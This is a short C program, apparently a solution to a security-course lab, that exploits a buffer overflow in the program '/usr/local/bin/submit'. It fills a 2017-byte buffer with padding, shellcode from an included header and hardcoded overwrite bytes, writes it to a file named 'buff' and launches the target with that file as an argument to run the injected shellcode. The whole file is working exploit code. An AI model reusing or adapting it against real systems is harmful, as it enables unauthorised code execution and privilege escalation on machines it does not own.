#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void) {
	char *args[4];
	char *env[1];
	char strbuf[2017];
	size_t i, len;
	FILE* fp;

	memset(strbuf, 0, sizeof(strbuf));
	for (i = 0; i < 980; ++i) {
		strbuf[i] = ',';
	}
	strcpy(strbuf+980, shellcode);
	len = strlen(strbuf);
	for (i = len; i < 2000; ++i) {
		strbuf[i] = '.';
	}
	strcpy(strbuf+2000, "\x10\x20\x30\x40\xd8\x07");
	strcpy(strbuf+2005, "\x98\xde\xbf\x44\xd8\xbf\xff");
	
	fp = fopen("buff", "w");
	fputs(strbuf, fp);
	fclose(fp);
	
	args[0] = TARGET;
	args[1] = "buff";
	args[2] = "hello!";
	args[3] = NULL;
	env[0] = NULL;

	execve(TARGET, args, env);
	// execve only returns if it fails
	fprintf(stderr, "execve failed\n");
	return 1;
}
